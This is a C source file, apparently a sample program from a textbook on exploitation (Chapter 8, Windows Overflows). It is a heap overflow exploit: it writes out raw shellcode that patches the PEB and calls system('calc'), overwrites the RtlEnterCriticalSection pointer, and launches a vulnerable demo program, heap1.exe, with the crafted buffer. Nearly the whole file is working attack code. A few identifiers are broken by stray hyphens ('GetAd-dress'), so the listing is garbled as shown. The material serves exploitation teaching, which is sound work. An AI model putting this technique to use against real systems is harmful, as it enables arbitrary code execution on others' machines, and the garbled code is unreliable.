/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 8: Windows Overflows
Sample Program #5

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

#include <stdio.h>
#include <windows.h>

     unsigned int GetAddress(char *lib, char *func);
     void fixupaddresses(char *tmp, unsigned int x);

     int main()
     {
            unsigned char buffer[300]="";
            unsigned char heap[8]="";
            unsigned char pebf[8]="";
            unsigned char shellcode[200]="";
            unsigned int address_of_system = 0;
            unsigned int address_of_RtlEnterCriticalSection = 0;
            unsigned char tmp[8]="";
            unsigned int cnt = 0;

            printf("Getting addresses...\n");
            address_of_system = GetAddress("msvcrt.dll","system");
            address_of_RtlEnterCriticalSection = GetAd-dress("ntdll.dll","RtlEnterCriticalSection");
            if(address_of_system == 0 || 	ad-dress_of_RtlEnterCriticalSection == 0)
                    return printf("Failed to get addresses\n");
            printf("Address of msvcrt.system\t\t\t= %.8X\n",address_of_system);
            printf("Address of ntdll.RtlEnterCriticalSection\t= %.8X\n",address_of_RtlEnterCriticalSection);
            strcpy(buffer,"heap1 ");

            // Shellcode - repairs the PEB then calls system("calc");
     strcat(buffer,"\"\x90\x90\x90\x90\x01\x90\x90\x6A\x30\x59\x64\x8B\x01\xB9");
            fixupaddresses(tmp,address_of_RtlEnterCriticalSection);
            strcat(buffer,tmp);
          strcat(buffer,"\x89\x48\x20\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9");
            fixupaddresses(tmp,address_of_system);
            strcat(buffer,tmp);
                    strcat(buffer,"\xFF\xD1");

            // Padding
            while(cnt < 58)
            {
                    strcat(buffer,"DDDD");
                    cnt ++;
            }

            // Pointer to RtlEnterCriticalSection pointer - 4 in PEB
            strcat(buffer,"\x1C\xF0\xFD\x7f");

            // Pointer to heap and thus shellcode
            strcat(buffer,"\x88\x06\x35");

            strcat(buffer,"\"");
            printf("\nExecuting heap1.exe... calc should open.\n");
            system(buffer);
            return 0;
     }

     unsigned int GetAddress(char *lib, char *func)
     {
            HMODULE l=NULL;
            unsigned int x=0;
            l = LoadLibrary(lib);
            if(!l)
                    return 0;
            x = GetProcAddress(l,func);
            if(!x)
                    return 0;
            return x;
     }     

     void fixupaddresses(char *tmp, unsigned int x)
     {
            unsigned int a = 0;
            a = x;
            a = a << 24;
            a = a >> 24;
            tmp[0]=a;
            a = x;
            a = a >> 8;
            a = a << 24;
            a = a >> 24 ;
            tmp[1]=a;
            a = x;
            a = a >> 16;
            a = a << 24;
            a = a >> 24;
            tmp[2]=a;
            a = x;
            a = a >> 24;
            tmp[3]=a;
     }
